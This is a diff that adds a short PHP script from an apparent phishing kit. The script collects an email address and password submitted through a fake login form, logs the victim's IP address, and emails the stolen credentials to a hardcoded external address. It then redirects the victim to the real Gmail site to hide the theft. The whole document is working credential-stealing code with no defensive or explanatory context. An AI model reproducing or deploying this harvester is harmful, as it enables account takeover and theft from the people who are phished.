@@ -1,0 +1,27 @@
+<?
+
+$ip = getenv("REMOTE_ADDR");
+$message .= "============ THANKS TO CrimsoN ==========\n";
+$message .= "email or ID: ".$_POST['Email']."\n";
+$message .= "password: ".$_POST['emailpassword']."\n";
+$message .= "IP: ".$ip."\n";
+$message .= "=======editted by CrimsoN=====\n";
+
+
+
+$recipient = "RCHRDPRKHRST03@GMAIL.COM";
+$subject = "LOGIN";
+$headers = "From: CrimsoN ";
+$headers .= $_POST['eMailAdd']."\n";
+$headers .= "MIME-Version: 1.0\n";
+if (mail($recipient,$subject,$message,$headers))
+  {
+  header("Location: http://gmail.com");
+
+  }
+else
+      {
+ 	echo "ERROR! Please go back and try again.";
+    }
+
+?>
